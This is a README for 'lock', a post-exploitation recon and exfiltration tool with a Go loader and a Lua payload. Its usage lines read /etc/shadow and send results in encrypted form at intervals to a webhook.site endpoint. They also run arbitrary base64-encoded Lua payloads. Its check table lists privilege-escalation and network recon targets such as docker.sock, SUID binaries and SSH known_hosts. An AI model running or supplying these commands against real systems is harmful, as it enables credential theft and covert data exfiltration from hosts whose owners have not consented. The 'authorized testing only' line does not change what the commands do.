### **lock**

```
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣛⣯⣭⣟⣛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⣡⣾⣿⣿⣿⣿⡿⢛⡻⣷⣮⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢱⡷⠶⠶⠶⣿⣿⠾⠿⠿⠾⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣦⣾⣿⣿⣿⣦⣾⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⣿⣿⣿⣿⣿⠷⣢⣾⢇⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣷⡝⢿⣶⣮⣍⣙⣒⣢⣿⡿⢫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣵⣾⣭⣭⣭⣭⣽⣶⣾⣶⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢫⣾⣿⣿⣿⢟⡛⢛⡛⣿⣿⣿⣿⣎⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⣱⣿⡏⣿⢛⡥⣓⣚⢛⣊⣈⠻⣿⢻⣿⣎⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⣱⣿⣿⡇⣡⣿⡬⠵⢞⡻⠶⣹⣧⡹⢸⣿⣿⣇⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢣⣿⣭⣭⣾⣿⣿⣦⠟⢭⣭⡛⢿⣿⣷⣬⣭⣿⣿⢸⣿⣿⣿⣿⣿
⠿⠿⠿⠿⠿⠌⠻⠿⠿⠿⠿⠿⠇⠻⠓⠲⠛⠾⠿⠿⠿⠿⠿⠿⠸⠿⠿⠿⠿⠿
```

Lightweight recon probe with encrypted exfil. Lua-based payload, Go loader.

## Build

```bash
go build -o lock lock.go
go build -o decrypt decrypt.go
```

## lock usage

```bash
# Local run
./lock -host 10.0.0.1 -port 22 -file-target /etc/shadow

# Beacon mode (key auto-generated, printed to stderr)
./lock -beacon https://webhook.site/<uuid> -interval 30s

# Custom key
./lock -beacon https://webhook.site/<uuid> -key "seed2"

# Custom payload
./lock -execute $(base64 -w0 custom.lua) -beacon https://webhook.site/<uuid>
```

## results decryption

```bash
./decrypt -key "xK9mP2nQ7vB4cR1s" -file response.json
./decrypt -key "xK9mP2nQ7vB4cR1s" -data "base64..."
```

## lock checks

| Category | Checks |
|----------|--------|
| **Privesc** | sudo -l, writable paths, docker.sock, SUID, interesting files |
| **Network** | ARP cache, SSH known_hosts, localhost services |
| **Env** | Container detection (docker/k8s/lxc/vm), user context |

## lock flags

| Flag | Default | Description |
|------|---------|-------------|
| `-host` | google.com | Target host |
| `-port` | 80 | Target port |
| `-file-target` | /etc/passwd | File to probe |
| `-beacon` | - | Exfil endpoint |
| `-interval` | 60s | Beacon interval |
| `-count` | 0 | Iterations (0=∞) |
| `-key` | - | Encryption key (auto if empty) |
| `-execute` | - | Base64 Lua payload |
| `-file` | - | Lua file path |

## lock beacon crypto

AES-256-GCM, SHA256-derived key, random nonce. Payload: `{"d":"<base64>"}`

---

*For authorized testing only.*